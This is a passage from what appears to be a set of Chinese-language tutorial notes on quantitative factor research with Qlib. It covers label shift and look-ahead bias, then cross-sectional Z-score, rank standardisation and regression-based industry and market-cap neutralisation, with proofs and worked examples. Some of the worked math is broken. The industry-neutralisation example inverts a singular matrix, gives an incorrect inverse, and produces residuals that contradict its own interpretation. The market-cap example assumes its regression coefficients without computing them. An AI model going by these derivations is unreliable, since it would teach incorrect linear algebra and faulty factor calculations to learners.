Bias。\n\n**方法2：回测夏普异常高**\n\n如果策略回测夏普&gt;5，说明可能存在Look-ahead Bias。\n\n**方法3：因子与未来价格相关性**\n\n检验因子是否与未来价格相关：\n\n```python\n# 检测因子是否与未来价格相关\nfor lag in [-1, -2, -5, -10]:\n    corr = df[&#039;factor&#039;].shift(lag).corr(df[&#039;price&#039;])\n    print(f&quot;Lag {lag}: {corr:.4f}&quot;)\n```\n\n如果 `lag=-1` 的相关性显著大于其他lag，说明因子包含未来信息。\n\n---\n\n## 6. 实盘vs回测的差异\n\n### 6.1 回测阶段\n\n在回测阶段，我们有完整的历史数据：\n\n**流程**：\n1. 加载历史数据（$t=1$ 到 $t=T$）\n2. 计算 Label Shift：$\\text{Label}_t = \\text{Return}_{t \\to t+h}$\n3. 训练模型：$\\text{Model}(\\text{Factor}_t) \\to \\text{Label}_t$\n4. 验证模型：计算IC、回测收益等\n\n**关键**：Label Shift是可行的，因为我们有未来数据。\n\n### 6.2 实盘阶段\n\n在实盘阶段，我们只有当前和过去的数据：\n\n**流程**：\n1. 加载实时数据（$t=1$ 到 $t=\\text{now}$）\n2. 计算当前因子：$\\text{Factor}_{\\text{now}}$\n3. 预测未来收益：$\\hat{\\text{Label}}_{\\text{now} \\to \\text{now}+h} = \\text{Model}(\\text{Factor}_{\\text{now}})$\n4. 交易决策：根据预测进行交易\n\n**关键**：Label不存在，我们只能预测。\n\n### 6.3 差异总结\n\n| 维度 | 回测 | 实盘 |\n|------|------|------|\n| **数据完整性** | 有完整历史和未来数据 | 只有当前和过去数据 |\n| **Label可用性** | 可用（Label Shift） | 不可用（需要预测） |\n| **验证方式** | 可以验证预测准确性 | 只能等待h期后验证 |\n| **风险** | 过拟合风险 | 实盘失败风险 |\n\n---\n\n## 7. 总结\n\nHorizon对齐（Label Shift）是量化投资中最基础、最核心的技术，它解决了&quot;当前的因子如何对应未来的收益&quot;这一根本问题。\n\n### 核心要点回顾\n\n1. **Horizon定义**：预测时长 $h$，从 $t$ 到 $t+h$ 的时间跨度\n2. **收益率公式**：\n   - 离散收益率：$R_{t \\to t+h} = (P_{t+h} - P_t) / P_t$\n   - 对数收益率：$r_{t \\to t+h} = \\ln(P_{t+h} / P_t)$\n3. **Label Shift**：\n   - 错误对齐：$\\{ \\text{Factor}_t, \\text{Return}_t \\}$（Look-ahead Bias）\n   - 正确对齐：$\\{ \\text{Factor}_t, \\text{Return}_{t \\to t+h} \\}$（Label Shift）\n4. **Pandas实现**：`df[&#039;label&#039;] = df[&#039;return&#039;].shift(-h)`\n5. **Qlib实现**：`Expression(Ref($close, -h) / $close - 1)`\n6. **Horizon选择**：\n   - 短期（h=1）：高频噪声，IC不稳定\n   - 中期（h=5）：信号稳定，IC中等\n   - 长期（h=20）：趋势主导，IC较高\n7. **常见错误**：Look-ahead Bias、未来均值、未来波动率等\n8. **实盘vs回测**：\n   - 回测：有完整数据，可以Label Shift\n   - 实盘：只有当前数据，需要预测\n\n### 量化投资的核心思想\n\nHorizon对齐的本质是**建立因果预测关系**：\n\n$$ \\text{Cause (t)} \\rightarrow \\text{Effect (t+h)} $$\n\n而不是：\n\n$$ \\text{Cause (t)} \\leftrightarrow \\text{Effect (t)} $$\n\n这个看似简单的技术，却是量化投资区别于&quot;赌大小&quot;的分水岭：\n- 赌大小：预测明天涨不涨（短期随机）\n- 量化投资：用当前因子预测未来收益（因果预测）\n\n在下一文档中，我们将探讨另一个核心主题：从&quot;预测绝对价格&quot;到&quot;预测相对强弱&quot;的量化思维转变。"},"quant/qlib/week1/03-横截面标准化与中性化":{"slug":"quant/qlib/week1/03-横截面标准化与中性化","filePath":"quant/qlib/week1/03-横截面标准化与中性化.md","title":"03-横截面标准化与中性化","links":[],"tags":[],"content":"横截面标准化与中性化\n引言\n在量化投资的因子研究中，横截面处理（Cross-sectional Processing）是最容易被忽视，却是最关键的技术环节。它不仅仅是一种数学技巧，更是一种投资哲学的转变：从”预测绝对价格”到”预测相对强弱”。\n本文将深入探讨横截面标准化的三大核心工具：Z-score、Rank和Neutralization，从数学原理到金融含义，从理论推导到实践应用，全面解析量化投资的横截面工程。\n\n1. Z-score数学原理\n1.1 标准化公式推导\nZ-score（标准分数）是最常用的标准化方法，它将数据转换为标准正态分布。在横截面处理的语境下，Z-score将同一时刻所有资产的因子值标准化。\n基础公式\n对于 t 时刻的横截面数据 \\{x_{1,t}, x_{2,t}, \\dots, x_{N,t}\\}，其中 N 是资产数量，Z-score定义为：\nz_{i,t} = \\frac{x_{i,t} - \\mu_t}{\\sigma_t}\n其中：\n\n\\mu_t = \\frac{1}{N}\\sum_{j=1}^N x_{j,t} 是 t 时刻的横截面均值\n\\sigma_t = \\sqrt{\\frac{1}{N}\\sum_{j=1}^N (x_{j,t} - \\mu_t)^2} 是横截面标准差\n\n性质证明\n性质1：标准化后的均值为0\n证明：\nE[z_{i,t}] = \\frac{1}{N}\\sum_{i=1}^N \\frac{x_{i,t} - \\mu_t}{\\sigma_t}\n= \\frac{1}{N\\sigma_t}\\sum_{i=1}^N (x_{i,t} - \\mu_t)\n= \\frac{1}{N\\sigma_t}\\left(\\sum_{i=1}^N x_{i,t} - N\\mu_t\\right)\n= \\frac{1}{N\\sigma_t}(N\\mu_t - N\\mu_t)\n= 0 \\quad \\blacksquare\n性质2：标准化后的方差为1\n证明：\nVar[z_{i,t}] = E[z_{i,t}^2] - (E[z_{i,t}])^2\n= E[z_{i,t}^2] - 0 \\quad \\text{（由性质1）}\n= \\frac{1}{N}\\sum_{i=1}^N \\left(\\frac{x_{i,t} - \\mu_t}{\\sigma_t}\\right)^2\n= \\frac{1}{N\\sigma_t^2}\\sum_{i=1}^N (x_{i,t} - \\mu_t)^2\n= \\frac{1}{N\\sigma_t^2} \\cdot N\\sigma_t^2\n= 1 \\quad \\blacksquare\n性质3：Z-score对线性变换不变\n对于线性变换 y = ax + b（a &gt; 0），标准化后的结果相同：\n证明：\ny_{i,t} = a x_{i,t} + b\n\\mu_y = \\frac{1}{N}\\sum_{j=1}^N (a x_{j,t} + b) = a\\mu_x + b\n\\sigma_y = \\sqrt{\\frac{1}{N}\\sum_{j=1}^N (a x_{j,t} + b - a\\mu_x - b)^2}\n= \\sqrt{\\frac{1}{N}\\sum_{j=1}^N a^2(x_{j,t} - \\mu_x)^2}\n= a\\sigma_x\nz_y = \\frac{y_{i,t} - \\mu_y}{\\sigma_y} = \\frac{a x_{i,t} + b - a\\mu_x - b}{a\\sigma_x}\n= \\frac{a(x_{i,t} - \\mu_x)}{a\\sigma_x} = \\frac{x_{i,t} - \\mu_x}{\\sigma_x} = z_x \\quad \\blacksquare\n这个性质非常重要：无论原始因子的量纲和单位如何，标准化后都统一到相同的尺度。\n1.2 金融意义：偏离均值的标准差倍数\nZ-score在金融中的含义远不止”标准化”，它度量的是一个资产相对于横截面平均水平的位置。\n解释维度\n维度1：相对强弱\n\nz = 0：资产 i 的因子值等于横截面平均水平\nz = 1：资产 i 的因子值比平均水平高1个标准差\nz = -1：资产 i 的因子值比平均水平低1个标准差\nz = 2：资产 i 的因子值显著高于平均水平（正态分布下约2.3%概率）\nz = -2：资产 i 的因子值显著低于平均水平（正态分布下约2.3%概率）\n\n维度2：风险度量\nZ-score可以视为风险暴露的度量：\n\n|z| 大：该资产的因子值显著偏离平均水平，可能是高暴露或高风险\n|z| 小：该资产的因子值接近平均水平，暴露正常\n\n维度3：标准化信号\n标准化后的信号可以作为模型输入：\n\n多个不同单位的因子（PE、ROE、波动率）可以线性组合\n模型训练更稳定（避免数值问题）\n因子权重可解释性更强\n\n实际案例\n假设我们有3只股票的PE值：\n\n股票A：PE = 30\n股票B：PE = 20\n股票C：PE = 10\n\n步骤1：计算均值和标准差\n\\mu = (30 + 20 + 10) / 3 = 20\n\\sigma = \\sqrt{((30-20)^2 + (20-20)^2 + (10-20)^2) / 3}\n= \\sqrt{(100 + 0 + 100) / 3} = \\sqrt{66.67} = 8.16\n步骤2：计算Z-score\nz_A = (30 - 20) / 8.16 = 1.22\nz_B = (20 - 20) / 8.16 = 0\nz_C = (10 - 20) / 8.16 = -1.22\n解读\n\n股票A：PE比平均水平高1.22个标准差，属于”高估值”股票\n股票B：PE等于平均水平，属于”中性估值”股票\n股票C：PE比平均水平低1.22个标准差，属于”低估值”股票\n\n如果我们在做价值投资（低PE买入），那么股票C是最佳选择（Z-score最小）。\n1.3 跨因子可加性的数学证明\nZ-score标准化的核心价值在于：不同单位、不同量纲的因子可以线性组合。\n问题提出\n假设我们有两个因子：\n\n因子1：PE（市盈率），单位是倍数，范围[5, 100]\n因子2：ROE（净资产收益率），单位是百分比，范围[-10%, 30%]\n\n如果我们想构建综合因子：\n\\text{Composite} = w_1 \\cdot \\text{PE} + w_2 \\cdot \\text{ROE}\n问题：\n\nPE的值是ROE的3-10倍，ROE的权重会被PE淹没\n不同单位无法直接比较\n\n解决方案：Z-score标准化\n对两个因子分别标准化：\nz_{\\text{PE}} = \\frac{\\text{PE} - \\mu_{\\text{PE}}}{\\sigma_{\\text{PE}}}\nz_{\\text{ROE}} = \\frac{\\text{ROE} - \\mu_{\\text{ROE}}}{\\sigma_{\\text{ROE}}}\n构建综合因子：\n\\text{Composite} = w_1 \\cdot z_{\\text{PE}} + w_2 \\cdot z_{\\text{ROE}}\n可加性证明\n我们要证明：标准化后的因子满足”可加性”，即不同因子的贡献是可比的。\n命题：对于任意两个因子 X 和 Y，标准化后 z_X 和 z_Y 在同一尺度上。\n证明：\n标准化后的因子满足：\nE[z_X] = E[z_Y] = 0\nVar[z_X] = Var[z_Y] = 1\n因此：\n\\text{Composite} = w_1 z_X + w_2 z_Y\nE[\\text{Composite}] = w_1 \\cdot 0 + w_2 \\cdot 0 = 0\nVar[\\text{Composite}] = w_1^2 \\cdot 1 + w_2^2 \\cdot 1 + 2 w_1 w_2 \\text{Cov}(z_X, z_Y)\n= w_1^2 + w_2^2 + 2 w_1 w_2 \\rho_{XY}\n其中 \\rho_{XY} = \\text{Corr}(z_X, z_Y) 是相关系数。\n关键点：\n\nz_X 和 z_Y 都在相似的范围（均值0，方差1）\n权重 w_1, w_2 直接反映因子的相对重要性\nw_1 = w_2 意味着两个因子同等重要 \\quad \\blacksquare\n\n实际应用\n假设我们构建价值因子：\n\\text{Value} = 0.6 \\cdot z_{\\text{PE}} - 0.4 \\cdot z_{\\text{ROE}}\n解读：\n\n低PE（z_{\\text{PE}} 小）是好\n高ROE（z_{\\text{ROE}} 大）是好\n因此：PE取负号，ROE取正号\n\n如果不标准化：\n\\text{Value} = 0.6 \\cdot \\text{PE} - 0.4 \\cdot \\text{ROE}\n问题：\n\nPE ≈ 30，ROE ≈ 0.15\nPE项 = 18，ROE项 = -0.06\nROE的贡献几乎可以忽略，被PE完全淹没\n\n1.4 时序Z-score vs 横截面Z-score\nQlib中Z-score有两种计算方式：时序（Time-Series）和横截面（Cross-Sectional），它们的金融含义完全不同。\n时序Z-score\n对于资产 i 在时间 t 的因子值 x_{i,t}，时序Z-score定义为：\nz^{\\text{ts}}_{i,t} = \\frac{x_{i,t} - \\mu_i}{\\sigma_i}\n其中：\n\n\\mu_i = \\frac{1}{T}\\sum_{t=1}^T x_{i,t} 是资产 i 的时序均值\n\\sigma_i = \\sqrt{\\frac{1}{T}\\sum_{t=1}^T (x_{i,t} - \\mu_i)^2} 是时序标准差\n\n金融含义：\n\n度量资产 i 的因子值相对于自身历史的位置\nz^{\\text{ts}}_{i,t} = 1：当前值比历史平均高1个标准差\nz^{\\text{ts}}_{i,t} = -1：当前值比历史平均低1个标准差\n\n应用场景：\n\n动量因子：当前价格是否显著高于历史平均\n均值回归策略：当前值是否显著偏离历史均值\n\n横截面Z-score\n对于 t 时刻的横截面数据 \\{x_{1,t}, x_{2,t}, \\dots, x_{N,t}\\}，横截面Z-score定义为：\nz^{\\text{cs}}_{i,t} = \\frac{x_{i,t} - \\mu_t}{\\sigma_t}\n其中：\n\n\\mu_t = \\frac{1}{N}\\sum_{j=1}^N x_{j,t} 是 t 时刻的横截面均值\n\\sigma_t = \\sqrt{\\frac{1}{N}\\sum_{j=1}^N (x_{j,t} - \\mu_t)^2} 是横截面标准差\n\n金融含义：\n\n度量资产 i 相对于其他资产的位置\nz^{\\text{cs}}_{i,t} = 1：当前值比其他资产平均水平高1个标准差\nz^{\\text{cs}}_{i,t} = -1：当前值比其他资产平均水平低1个标准差\n\n应用场景：\n\n相对强弱：当前资产是否比其他资产强\n横截面选股：选出比其他资产表现好的股票\n\n对比分析\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n维度时序Z-score横截面Z-score比较基准自身历史其他资产计算维度时间维度资产维度金融含义当前是否偏离历史平均当前是否优于其他资产策略类型均值回归、趋势跟踪相对强弱、多因子选股Qlib默认否是\n实际案例\n假设我们有2只股票5天的价格：\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n时间股票A价格股票B价格Day 110050Day 211055Day 312060Day 413065Day 514070\n时序Z-score（对每只股票单独计算）\n股票A：\n\n\\mu_A = (100 + 110 + 120 + 130 + 140) / 5 = 120\n\\sigma_A = \\sqrt{((100-120)^2 + \\cdots + (140-120)^2) / 5} = 15.81\nDay 5: z_A = (140 - 120) / 15.81 = 1.26\n\n股票B：\n\n\\mu_B = (50 + 55 + 60 + 65 + 70) / 5 = 60\n\\sigma_B = 7.91\nDay 5: z_B = (70 - 60) / 7.91 = 1.26\n\n解读：\n\n两只股票在Day 5都比各自历史高1.26个标准差\n如果做均值回归，都应该卖出\n\n横截面Z-score（对每一天单独计算）\nDay 5：\n\n\\mu_{\\text{Day5}} = (140 + 70) / 2 = 105\n\\sigma_{\\text{Day5}} = \\sqrt{((140-105)^2 + (70-105)^2) / 2} = 35\nz_A = (140 - 105) / 35 = 1\nz_B = (70 - 105) / 35 = -1\n\n解读：\n\n股票A比股票B强2个标准差（z_A - z_B = 1 - (-1) = 2）\n如果做多空策略：买入股票A，做空股票B\n\n关键差异\n时序Z-score关注”当前是否偏离历史”，横截面Z-score关注”当前是否优于其他”。在多因子选股中，我们更关注后者，因此Qlib默认使用横截面Z-score。\n\n2. Rank标准化\n2.1 Rank公式与离散化\nRank标准化将连续的因子值转换为离散的排序位置，再缩放到 [0, 1] 区间。它是对异常值最鲁棒的标准化方法。\n基础公式\n对于 t 时刻的横截面数据 \\{x_{1,t}, x_{2,t}, \\dots, x_{N,t}\\}，Rank标准化定义为：\n\\text{Rank}(x_{i,t}) = \\frac{\\text{rank}(x_{i,t}) - 1}{N - 1}\n其中 \\text{rank}(x_{i,t}) 是 x_{i,t} 在 \\{x_{1,t}, x_{2,t}, \\dots, x_{N,t}\\} 中的排序位置（从1开始，1是最小值，N是最大值）。\n离散化过程\nRank标准化实际上是三步过程：\nStep 1：排序\nr_i = \\text{rank}(x_{i,t})\n将连续值 x_{i,t} 转换为离散的排序位置 r_i \\in \\{1, 2, \\dots, N\\}\nStep 2：平移\nr&#039;_i = r_i - 1\n将排序位置从 [1, N] 平移到 [0, N-1]\nStep 3：缩放\nz_i = \\frac{r&#039;_i}{N - 1}\n将排序位置从 [0, N-1] 缩放到 [0, 1]\n性质\n性质1：输出在 [0, 1] 区间\n证明：\n\n最小值：z_{\\min} = (1 - 1) / (N - 1) = 0\n最大值：z_{\\max} = (N - 1) / (N - 1) = 1\n任意值：0 \\le z_i \\le 1 \\quad \\blacksquare\n\n性质2：均匀分布\n在无重复值的情况下，排序后的值在 [0, 1] 上均匀分布：\nP(z_i \\le \\alpha) = \\alpha, \\quad \\forall \\alpha \\in [0, 1]\n这意味着：\n\n排名前10%的股票 z &gt; 0.9\n排名后10%的股票 z &lt; 0.1\n\n性质3：对单调变换不变\n对于任意单调递增函数 f(\\cdot)，标准化后的排序不变：\n\\text{Rank}(f(x_i)) = \\text{Rank}(x_i)\n证明：\n单调递增函数保持顺序：\nx_i &lt; x_j \\iff f(x_i) &lt; f(x_j)\n因此排序位置相同：\n \\text{rank}(f(x_i)) = \\text{rank}(x_i) \\quad \\blacksquare\n这个性质非常重要：Rank只关心”谁比谁大”，不关心大多少。\n2.2 异常值处理的鲁棒性证明\nRank标准化最大的优势在于对异常值（Outlier）的鲁棒性。\n问题场景\n假设我们有4只股票的PE值：\n\n股票A：PE = 15\n股票B：PE = 20\n股票C：PE = 25\n股票D：PE = 10000  ← 异常值（数据错误或极端情况）\n\nZ-score标准化\n步骤1：计算均值和标准差\n\\mu = (15 + 20 + 25 + 10000) / 4 = 2515\n\\sigma = \\sqrt{((15-2515)^2 + (20-2515)^2 + (25-2515)^2 + (10000-2515)^2) / 4}\n= \\sqrt{(2495^2 + 2495^2 + 2490^2 + 7485^2) / 4}\n= \\sqrt{(6,225,025 + 6,225,025 + 6,200,100 + 56,025,225) / 4}\n= \\sqrt{74,675,375 / 4} = \\sqrt{18,668,843.75} = 4321\n\\approx 4321\n步骤2：计算Z-score\nz_A = (15 - 2515) / 4321 = -0.58\nz_B = (20 - 2515) / 4321 = -0.58\nz_C = (25 - 2515) / 4321 = -0.58\nz_D = (10000 - 2515) / 4321 = 1.73\n问题分析：\n\n股票D的异常值（10000）严重影响了均值和标准差\nA、B、C三只股票的Z-score几乎相同（-0.58），无法区分\n股票D的Z-score是1.73，看起来不极端，但实际上它是严重异常值\n\nRank标准化\n步骤1：排序\nx_A = 15, x_B = 20, x_C = 25, x_D = 10000\n\\text{rank}(x_A) = 1\n\\text{rank}(x_B) = 2\n\\text{rank}(x_C) = 3\n\\text{rank}(x_D) = 4\n步骤2：标准化\nz_A = (1 - 1) / (4 - 1) = 0\nz_B = (2 - 1) / 3 = 0.33\nz_C = (3 - 1) / 3 = 0.67\nz_D = (4 - 1) / 3 = 1\n优势分析：\n\n股票D的异常值只影响它自己的排序（第4名），不影响其他股票\nA、B、C三只股票的排序清晰区分（0, 0.33, 0.67）\n股票D虽然是异常值，但在Rank中只是”第4名”，不会拉高或拉低其他股票的分数\n\n鲁棒性证明\n命题：Rank标准化对异常值不敏感。\n证明：\n设横截面数据 \\{x_1, x_2, \\dots, x_N\\}，其中 x_N 是异常值（远大于其他数据）。\nZ-score的影响：\n\\mu = \\frac{1}{N}\\sum_{i=1}^N x_i = \\frac{1}{N}\\left(\\sum_{i=1}^{N-1} x_i + x_N\\right)\n当 x_N \\gg x_i（i &lt; N）时，\\mu \\approx x_N / N，均值被拉高。\n\\sigma = \\sqrt{\\frac{1}{N}\\sum_{i=1}^N (x_i - \\mu)^2}\n当 x_N 很大时，(x_N - \\mu)^2 很大，标准差被拉高。\n对于正常数据 x_i（i &lt; N）：\nz_i = \\frac{x_i - \\mu}{\\sigma}\n由于 \\mu 和 \\sigma 都被 x_N 拉高，z_i 的值会变得接近，难以区分。\nRank的影响：\n对于任意 i &lt; j &lt; N：\nx_i &lt; x_j \\implies \\text{rank}(x_i) &lt; \\text{rank}(x_j)\n排序不受 x_N 的大小影响，只受相对大小影响。\n\\text{Rank}(x_i) = \\frac{\\text{rank}(x_i) - 1}{N - 1}\nx_N 只影响它自己的排序，不影响其他数据的排序位置。\\quad \\blacksquare\n2.3 适用场景分析\nRank标准化在以下场景中表现优异：\n场景1：因子分布严重偏态\n如果因子的分布不是正态分布，而是严重偏态（如指数分布、幂律分布），Z-score的效果会变差。\n案例：市值因子\n大多数股票的市值较小，少数股票市值巨大（如茅台、腾讯）。市值的分布是右偏的（长尾分布）。\n\nZ-score：会被大市值股票拉高均值和标准差，中小市值股票的Z-score会集中在负值区域\nRank：不受分布形状影响，只看相对排序\n\n场景2：存在极端异常值\n如果因子中存在极端异常值（数据错误、黑天鹅事件），Z-score会失效。\n案例：停牌后复牌的股票\n某股票停牌3年后复牌，涨了10倍。这个极端值会严重拉高Z-score的均值和标准差。\n\nZ-score：受极端值影响严重\nRank：异常值只是”第1名”，不影响其他股票\n\n场景3：只关注相对强弱\n如果你的策略只关心”哪个股票比哪个强”，而不关心强多少，Rank是最佳选择。\n案例：多空对冲策略\n做多前20%股票，做空后20%股票。策略只关心排名，不关心具体分数。\n\nZ-score：需要选择阈值（如 z &gt; 1），阈值的选择会影响策略\nRank：直接选前20%（z &gt; 0.8），阈值清晰\n\n场景4：非线性关系\n如果因子与收益的关系是非线性的，Rank可以捕捉到这种非线性。\n案例：动量因子\n动量与收益的关系可能是非线性的：\n\n\n动量前10%：收益最高\n\n\n动量10%-50%：收益中等\n\n\n动量后50%：收益最低\n\n\nZ-score：假设线性关系，可能忽略非线性结构\n\n\nRank：自然处理非线性，只看排序分组\n\n\n不适用场景\n场景1：需要精确比较\n如果需要精确比较两个因子的值，Rank不适用，因为它丢失了数值信息。\n案例：风险管理\n如果需要计算因子的波动率、VaR等，Z-score更合适。\n场景2：因子分布接近正态\n如果因子的分布接近正态分布，Z-score的统计性质更好（均值0、方差1）。\n案例：因子组合的权重计算\nZ-score的均值为0、方差为1，便于理论推导和权重计算。\n\n3. Neutralization回归模型\n3.1 数学推导\nNeutralization（中性化）是横截面处理中最复杂、最强大的工具。它的核心思想是通过回归剔除”作弊因素”（如行业、市值），只保留”纯Alpha”。\n线性回归模型\n对于 t 时刻的横截面数据，我们构建多元线性回归模型：\nx_i = \\beta_0 + \\sum_{j=1}^K \\beta_j \\cdot f_{i,j} + \\varepsilon_i\n其中：\n\nx_i：资产 i 的因子值（如PE、ROE、动量等）\n\\beta_0：截距项\n\\beta_j：第 j 个控制变量的回归系数\nf_{i,j}：资产 i 在第 j 个控制变量上的暴露（如行业哑变量、市值）\n\\varepsilon_i：残差（中性化后的因子值）\n\n矩阵形式\n设：\n\ny \\in \\mathbb{R}^N：因子值向量 \\begin{bmatrix}x_1 \\\\ x_2 \\\\ \\vdots \\\\ x_N\\end{bmatrix}\nX \\in \\mathbb{R}^{N \\times (K+1)}：控制变量矩阵 \\begin{bmatrix}1 &amp; f_{1,1} &amp; \\cdots &amp; f_{1,K} \\\\ 1 &amp; f_{2,1} &amp; \\cdots &amp; f_{2,K} \\\\ \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots \\\\ 1 &amp; f_{N,1} &amp; \\cdots &amp; f_{N,K}\\end{bmatrix}\n\\beta \\in \\mathbb{R}^{K+1}：回归系数向量 \\begin{bmatrix}\\beta_0 \\\\ \\beta_1 \\\\ \\vdots \\\\ \\beta_K\\end{bmatrix}\n\\varepsilon \\in \\mathbb{R}^N：残差向量 \\begin{bmatrix}\\varepsilon_1 \\\\ \\varepsilon_2 \\\\ \\vdots \\\\ \\varepsilon_N\\end{bmatrix}\n\n回归方程：\ny = X\\beta + \\varepsilon\nOLS估计\n通过最小二乘法估计 \\beta：\n\\hat{\\beta} = \\arg\\min_\\beta \\|y - X\\beta\\|^2\n求导：\n\\frac{\\partial}{\\partial \\beta} \\|y - X\\beta\\|^2 = -2X^T(y - X\\beta)\n令导数为0：\n-2X^T(y - X\\beta) = 0\nX^T y - X^T X \\beta = 0\nX^T X \\beta = X^T y\n\\beta = (X^T X)^{-1} X^T y\n残差计算\n\\varepsilon = y - X\\beta\n= y - X(X^T X)^{-1} X^T y\n= (I - H)y\n其中 H = X(X^T X)^{-1} X^T 是投影矩阵（Hat Matrix）。\n中性化后的因子\nx^{\\text{neu}}_i = \\varepsilon_i = x_i - (\\beta_0 + \\sum_{j=1}^K \\beta_j \\cdot f_{i,j})\n3.2 行业中性化\n目的\n剔除行业因子暴露，确保因子收益不来自行业轮动。\n场景示例\n假设你有3只股票：\n\n股票A：行业=白酒，因子值=10\n股票B：行业=白酒，因子值=8\n股票C：行业=科技，因子值=9\n\n不中性化的问题\n如果白酒板块整体上涨（行业Beta），股票A和B的收益部分来自行业因子，而不是你的因子有效。\n中性化过程\n步骤1：构造行业哑变量\n构造行业哑变量矩阵 X：\nX = \\begin{bmatrix}1 &amp; 1 &amp; 0 \\\\ 1 &amp; 1 &amp; 0 \\\\ 1 &amp; 0 &amp; 1\\end{bmatrix}\n其中：\n\n第1列：截距项（全为1）\n第2列：白酒行业哑变量（1=是，0=否）\n第3列：科技行业哑变量（1=是，0=否）\n\n步骤2：回归\ny = \\begin{bmatrix}10 \\\\ 8 \\\\ 9\\end{bmatrix} = X\\beta + \\varepsilon\n计算 \\beta：\n\\beta = (X^T X)^{-1} X^T y\nX^T X = \\begin{bmatrix}1 &amp; 1 &amp; 1 \\\\ 1 &amp; 1 &amp; 0 \\\\ 0 &amp; 0 &amp; 1\\end{bmatrix} \\begin{bmatrix}1 &amp; 1 &amp; 0 \\\\ 1 &amp; 1 &amp; 0 \\\\ 1 &amp; 0 &amp; 1\\end{bmatrix} = \\begin{bmatrix}3 &amp; 2 &amp; 1 \\\\ 2 &amp; 2 &amp; 0 \\\\ 1 &amp; 0 &amp; 1\\end{bmatrix}\n(X^T X)^{-1} = \\frac{1}{2}\\begin{bmatrix}2 &amp; -2 &amp; -2 \\\\ -2 &amp; 2 &amp; 2 \\\\ -2 &amp; 2 &amp; 4\\end{bmatrix} = \\begin{bmatrix}1 &amp; -1 &amp; -1 \\\\ -1 &amp; 1 &amp; 1 \\\\ -1 &amp; 1 &amp; 2\\end{bmatrix}\nX^T y = \\begin{bmatrix}1 &amp; 1 &amp; 1 \\\\ 1 &amp; 1 &amp; 0 \\\\ 0 &amp; 0 &amp; 1\\end{bmatrix} \\begin{bmatrix}10 \\\\ 8 \\\\ 9\\end{bmatrix} = \\begin{bmatrix}27 \\\\ 18 \\\\ 9\\end{bmatrix}\n\\beta = \\begin{bmatrix}1 &amp; -1 &amp; -1 \\\\ -1 &amp; 1 &amp; 1 \\\\ -1 &amp; 1 &amp; 2\\end{bmatrix} \\begin{bmatrix}27 \\\\ 18 \\\\ 9\\end{bmatrix} = \\begin{bmatrix}27 - 18 - 9 \\\\ -27 + 18 + 9 \\\\ -27 + 18 + 18\\end{bmatrix} = \\begin{bmatrix}0 \\\\ 0 \\\\ 9\\end{bmatrix}\n步骤3：计算残差\n\\varepsilon = y - X\\beta = \\begin{bmatrix}10 \\\\ 8 \\\\ 9\\end{bmatrix} - \\begin{bmatrix}1 &amp; 1 &amp; 0 \\\\ 1 &amp; 1 &amp; 0 \\\\ 1 &amp; 0 &amp; 1\\end{bmatrix} \\begin{bmatrix}0 \\\\ 0 \\\\ 9\\end{bmatrix}\n= \\begin{bmatrix}10 \\\\ 8 \\\\ 9\\end{bmatrix} - \\begin{bmatrix}0 \\\\ 0 \\\\ 9\\end{bmatrix} = \\begin{bmatrix}10 \\\\ 8 \\\\ 0\\end{bmatrix}\n解读\n\n股票A：残差=10，说明它比白酒行业平均（9）高1\n股票B：残差=8，说明它比白酒行业平均（9）低1\n股票C：残差=0，说明它等于科技行业平均（9）\n\n经济含义\n\\varepsilon_i 是”剔除行业因素后的纯Alpha”：\n\n股票A的因子收益中，剔除行业贡献后，还剩10\n股票B的因子收益中，剔除行业贡献后，只剩8\n股票C的因子收益中，科技行业贡献了9，纯Alpha为0\n\n3.3 市值中性化\n目的\n剔除市值风格因子暴露，确保因子收益不来自大小盘风格切换。\n场景示例\n假设我们有4只股票：\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n股票行业市值（亿）因子值A白酒10010B白酒1008C科技509D科技507\n回归模型\nx_i = \\beta_0 + \\beta_1 \\cdot \\text{industry}_{i} + \\beta_2 \\cdot \\log(\\text{cap}_i) + \\varepsilon_i\n其中：\n\n\\text{industry}_i：行业哑变量（1=白酒，0=科技）\n\\log(\\text{cap}_i)：对数市值（市值通常服从对数正态分布）\n\n构造控制变量矩阵\nX = \\begin{bmatrix}1 &amp; 1 &amp; \\log(100) \\\\ 1 &amp; 1 &amp; \\log(100) \\\\ 1 &amp; 0 &amp; \\log(50) \\\\ 1 &amp; 0 &amp; \\log(50)\\end{bmatrix} = \\begin{bmatrix}1 &amp; 1 &amp; 4.61 \\\\ 1 &amp; 1 &amp; 4.61 \\\\ 1 &amp; 0 &amp; 3.91 \\\\ 1 &amp; 0 &amp; 3.91\\end{bmatrix}\n计算残差\n（省略详细计算，假设回归结果为 \\beta = [0, 0.5, 0.5]^T）\n\\varepsilon = y - X\\beta\n经济含义\n\\varepsilon_i 是”剔除行业和市值效应后的纯Alpha”：\n\n股票A的因子值=10，但考虑到行业效应（+0.5）和市值效应（0.5 \\times 4.61 = 2.31），纯Alpha≈7.19\n股票B的因子值=8，纯Alpha≈5.19\n股票C的因子值=9，但市值较小（0.5 \\times 3.91 = 1.96），纯Alpha≈7.04\n股票D的因子值=7，纯Alpha≈5.04\n\n3.4 双重中性化\n定义\n同时进行行业中性化和市值中性化，剔除两个维度的”作弊因素”。\n回归模型\nx_i = \\beta_0 + \\sum_{j=1}^J \\alpha_j \\cdot \\text{industry}_{i,j} + \\beta_1 \\cdot \\log(\\text{cap}_i) + \\varepsilon_i\n其中：\n\n\\text{industry}_{i,j}：行业 j 的哑变量（J 个行业）\n\\alpha_j：行业 j 的回归系数\n\\log(\\text{cap}_i)：对数市值\n\\varepsilon_i：残差（双重中性化后的因子）\n\n残差的经济含义\n\\varepsilon_i = \\text{纯Alpha} = x_i - \\underbrace{\\sum_{j=1}^J \\alpha_j \\cdot \\text{industry}_{i,j}}_{\\text{行业效应}} - \\underbrace{\\beta_1 \\cdot \\log(\\text{cap}_i)}_{\\text{市值效应}}\n\\varepsilon_i 表示：\n\n剔除了行业效应（同一行业内的股票）\n剔除了市值效应（同等市值下的股票）\n剩下的才是”纯选股能力”\n\n3.5 残差的可解释性证明\n命题1：残差均值为0\n证明：\nE[\\varepsilon] = \\frac{1}{N}\\sum_{i=1}^N \\varepsilon_i = 